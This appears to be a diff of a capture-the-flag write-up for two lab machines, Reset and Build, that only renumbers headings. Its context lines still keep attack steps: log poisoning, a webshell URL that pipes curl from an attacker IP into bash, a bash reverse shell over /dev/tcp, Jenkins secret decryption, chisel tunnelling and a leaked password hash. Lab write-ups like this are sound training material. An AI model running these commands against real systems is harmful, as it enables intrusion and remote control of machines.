@@ -11,7 +11,7 @@ description: VL Mix of 2 machines Reset/Build by Ethicxz
 
 ![alt text](../assets/image_reset-build/reset.jpeg)
 
-### Reset
+## Reset
 
 # Before Starting 
 ```console
@@ -25,7 +25,7 @@ Target > 10.10.90.125
 513/tcp open  login
 514/tcp open  shell
 ```
-## Acces to admin dashboard
+### Acces to admin dashboard
 
 First we have a website with a login panel
 
@@ -37,7 +37,7 @@ If we intercept the request when we click on ```Forgot Password``` we can reset 
 
 Ok now we can read 2 files, ```/var/log/auth.log``` and ```/var/log/syslog```
 
-## Log poisoning
+### Log poisoning
 
 The ```auth.log``` file is linked to rsh authentication, so we can try log poisoning
 
@@ -63,7 +63,7 @@ http://10.10.90.125/dashboard.php?cmd=curl%20http://10.8.2.163/x|/bin/bash
 
 bash -c 'bash -i >& /dev/tcp/10.8.2.163/9001 0>&1'
 ```
-## SADM
+### SADM
 
 Ok now if we check in which groups we are with ```id```, we can see ```adm```
 
@@ -79,7 +79,7 @@ journalctl _PID=736
 ```
 In the output we find the ```sadm``` password, login as ```sadm``` and check sudo rights
 
-## Privesc on Reset
+### Privesc on Reset
 
 ```bash
 sadm@reset:~$ sudo -l
@@ -110,7 +110,7 @@ Nice !!
 
 ![alt text](../assets/image_reset-build/build.jpeg)
 
-### Build
+## Build
 
 # Before starting
 
@@ -139,7 +139,7 @@ There is a gitea on the port ```3000``` and if we click on ```Explore``` we can 
 
 So we probably need to find some creds to login in gitea and modify this script to gain a revshell
 
-## Jenkins password
+### Jenkins password
 
 Let's digging in rsync
 
@@ -169,7 +169,7 @@ python3 ../decrypt.py jenkins_configuration/secrets/master.key jenkins_configura
 
 REDACTED
 ```
-## Revshell thanks to gitea
+### Revshell thanks to gitea
 
 Login in gitea
 
@@ -196,7 +196,7 @@ Ok now we have a shell in a container
 
 As we saw before, 3306 and 8081 are filtered in the nmap scan, so we probably need to access it internally, let's forward with chisel
 
-## Mysql
+### Mysql
 
 ```bash
 chisel server -p 999 --socks5 --reverse
@@ -242,7 +242,7 @@ admin;$2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq
 
 Crack the password and login to ```172.18.0.6```
 
-## Privesc with PowerDNS and RSH
+### Privesc with PowerDNS and RSH
 
 If we go to ```http://172.18.0.6/domain/build.vl``` we can see this 
 
